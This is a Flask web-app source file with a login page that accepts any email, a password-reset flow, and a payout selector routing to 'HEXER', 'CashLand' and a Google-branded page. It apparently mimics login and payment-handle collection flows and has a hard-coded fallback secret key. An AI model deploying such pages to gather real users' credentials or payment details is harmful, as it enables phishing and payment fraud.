import os
from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)

# Set SECRET_KEY in Render's Environment Variables.
# The fallback is only useful for local testing.
app.secret_key = os.environ.get(
    "SECRET_KEY",
    "dev-only-change-this-secret"
)


# ─────────────────────────────────────────────
# Main / Login
# ─────────────────────────────────────────────

@app.get("/")
def login():
    return render_template("login.html")


@app.post("/login")
def handle_login():
    email = request.form.get("email", "").strip()

    if not email:
        return render_template(
            "login.html",
            error="Please enter your email or mobile number."
        )

    session["demo_email"] = email

    return redirect(url_for("demo_result"))


# ─────────────────────────────────────────────
# Forgot Password
# ─────────────────────────────────────────────

@app.get("/forgot-password")
def forgot_password():
    return render_template("forgot.html")


@app.post("/forgot-password")
def handle_forgot_password():
    email = request.form.get("email", "").strip()

    if not email:
        return render_template(
            "forgot.html",
            error="Please enter your email or mobile number."
        )

    session["reset_email"] = email

    return redirect(url_for("reset_sent"))


@app.get("/reset-sent")
def reset_sent():
    return render_template(
        "reset_sent.html",
        email=session.get("reset_email", "")
    )


# ─────────────────────────────────────────────
# Demo Login Result
# ─────────────────────────────────────────────

@app.get("/demo-result")
def demo_result():
    return render_template(
        "demo_result.html",
        email=session.get("demo_email", "")
    )


# ─────────────────────────────────────────────
# Payout Page
# ─────────────────────────────────────────────

@app.get("/payout")
def payout():
    return render_template("payout.html")


@app.post("/payout/select")
def payout_select():
    method = request.form.get("method", "").lower()

    if method == "hexer":
        return redirect(url_for("hexer_page"))

    if method == "cashland":
        return redirect(url_for("cashland"))

    if method == "card":
        return redirect(url_for("google_page"))

    return redirect(url_for("payout"))


# ─────────────────────────────────────────────
# HEXER
# ─────────────────────────────────────────────

@app.get("/hexer")
def hexer_page():
    # Put your existing HEXER page at:
    # templates/hexer.html
    return render_template("hexer.html")


# ─────────────────────────────────────────────
# CASH LAND
# ─────────────────────────────────────────────

@app.get("/cashland")
def cashland():
    return render_template("cashland.html")


@app.post("/cashland")
def cashland_receive():
    handle = request.form.get("handle", "").strip()

    if not handle:
        return redirect(url_for("cashland"))

    # Demo only.
    # Don't store financial credentials or sensitive payment information.
    session["cashland_handle"] = handle

    return render_template(
        "cashland.html",
        success=True,
        handle=handle
    )


# ─────────────────────────────────────────────
# Existing Google Page
# ─────────────────────────────────────────────

@app.get("/google")
def google_page():
    # Put your existing file at:
    # templates/google.html
    return render_template("google.html")


# ─────────────────────────────────────────────
# Health Check
# ─────────────────────────────────────────────

@app.get("/health")
def health():
    return {
        "status": "ok",
        "service": "HEXER"
    }


# ─────────────────────────────────────────────
# Local Development
# ─────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))

    app.run(
        host="0.0.0.0",
        port=port,
        debug=False
    )
